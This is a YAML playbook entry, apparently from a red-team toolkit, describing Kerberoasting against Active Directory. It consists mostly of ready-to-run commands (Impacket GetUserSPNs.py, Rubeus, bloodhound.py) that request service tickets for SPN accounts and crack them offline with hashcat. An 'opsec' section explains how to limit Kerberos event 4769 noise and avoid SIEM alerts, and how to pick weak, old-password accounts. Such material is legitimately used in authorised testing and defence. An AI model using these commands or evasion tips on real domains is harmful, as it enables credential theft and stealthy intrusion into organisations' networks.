name: Kerberoasting
description: Request TGS tickets for accounts with SPNs and crack offline
commands:
- '# Impacket - request all SPN tickets'
- GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<YOUR_USER>:<YOUR_PASSWORD>'
- ''
- '# Impacket - target specific user'
- GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<YOUR_USER>:<YOUR_PASSWORD>' -target-user '<TARGET_USER>'
- ''
- '# Rubeus - all SPNs'
- Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
- ''
- '# Rubeus - target specific user'
- Rubeus.exe kerberoast /user:<TARGET_USER> /outfile:hashes.txt /nowrap
- ''
- '# bloodhound.py - discover SPNs during collection'
- bloodhound.py -u '<YOUR_USER>' -p '<YOUR_PASSWORD>' -d '<DOMAIN>' -dc '<DC_IP>' -c All
- ''
- '# Crack with hashcat'
- hashcat -m 13100 hashes.txt wordlist.txt
opsec:
- TGS requests generate Kerberos event 4769 (Service Ticket Request)
- High volume of TGS requests may trigger SIEM alerts
- Target users with old passwords (>1 year) for faster cracking
- Consider roasting specific users vs all SPNs to reduce noise
references:
- https://attack.mitre.org/techniques/T1558/003/
- https://www.thehacker.recipes/ad/movement/kerberos/kerberoast
